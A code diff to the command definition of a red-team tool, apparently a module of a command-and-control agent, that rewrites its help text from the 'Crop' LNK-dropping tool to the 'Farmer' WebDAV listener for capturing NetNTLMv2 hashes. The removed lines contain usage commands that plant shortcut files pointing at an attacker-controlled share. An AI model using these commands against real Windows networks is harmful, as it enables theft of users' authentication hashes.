@@ -35,18 +35,14 @@ class FarmerCommand(CommandBase):
     help_cmd = "farmer"
     description = "Farmer is a project for collecting NetNTLM hashes in a Windows domain."
     help_cmd = """
-Crop https://github.com/mdsecactivebreach/Farmer
+Farmer https://github.com/mdsecactivebreach/Farmer
     created by @domchell
 
-Crop is a tool that can create LNK files that initiate a WebDAV connection when browsing to a folder where it's stored.
+Farmer is acts as a WebDAV server in order to catch NetNTLMv2 Authentication hashes from Windows clients.
 
-Supported LNK types: .lnk, .url, .library-ms, .searchconnect-ms
-
-Drop an LNK file
-crop -targetLocation \\myserver\shared\ -targetFilename Athena.lnk -targetPath \\MyCropServer:8080\harvest -targetIcon \\MyCropServer:8080\harvest\my.ico
-
-Drop a .searchconnect-ms
-crop -targetLocation \\myserver\shared\ -targetFilename Athena.searchconnector-ms -targetPath \\MyCropServer:8080\harvest -recurse      
+The server will listen on the specified port and will respond to any WebDAV request with a 401 Unauthorized response. The server will then wait for the client to send the NTLMv2 authentication hash.
+Usage: farmer [port]
+     
     """
     version = 1
     is_exit = False
